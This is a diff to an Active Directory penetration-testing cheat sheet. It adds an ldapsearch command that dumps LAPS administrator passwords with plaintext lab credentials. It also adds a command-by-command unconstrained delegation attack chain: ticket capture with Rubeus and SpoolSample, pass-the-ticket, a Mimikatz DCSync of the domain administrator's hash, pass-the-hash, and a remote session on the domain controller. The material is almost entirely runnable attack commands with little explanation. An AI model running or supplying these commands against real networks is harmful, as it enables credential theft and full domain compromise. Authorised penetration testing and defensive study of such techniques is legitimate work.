@@ -490,7 +490,9 @@ Get-Domainuser -Name <user>
 ### LAPS
 https://www.hackingarticles.in/credential-dumpinglaps/
 ```console
+ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
 ldapsearch -x -h 192.168.240.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
+#Get pwd
 
 $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
@@ -563,6 +565,34 @@ invoke-command -Computername dc.pentesting.local -ScriptBlock{whoami;hostname}
 Enter-PSSession -ComputerName dc.pentesting.local
 ```
 
+
+### UnConstraint delegation computer
+```
+powershell -ep bypass
+Import-Module .\PowerView
+Get-DomainComputer -unconstrained  #search a computer student
+
+1.- Monitor tickets
+.\Rubeus.exe monitor /interval:1
+.\spoolsample.exe dc.pentesting.local student.pentesting.local   #request ticket
+
+2.- Inject ticket
+copy ticket
+.\Rubeus.exe ptt /ticket:<ticket>
+
+3.- Viwe ticket
+.\Rubeus klist
+
+4.- Attack
+Import-Module .\Invoke-Mimikatz.ps1
+>Invoke-Mimikatz -Command '"lsadump::dcsync /user:pentesting\administrator"'
+#Get Hash NTLM
+#pth
+Invoke-mimikatz -Command '"sekurlsa::pth /user:administrator /domain:pentest /ntlm:NTLM /run:powershell.exe"'
+whoami
+invoke-command -Computername dc.pentesting.local -ScriptBlock{whoami;hostname}
+Enter-PSSession -ComputerName dc.pentesting.local
+```
 
 ### Priv Groups of member
 ```
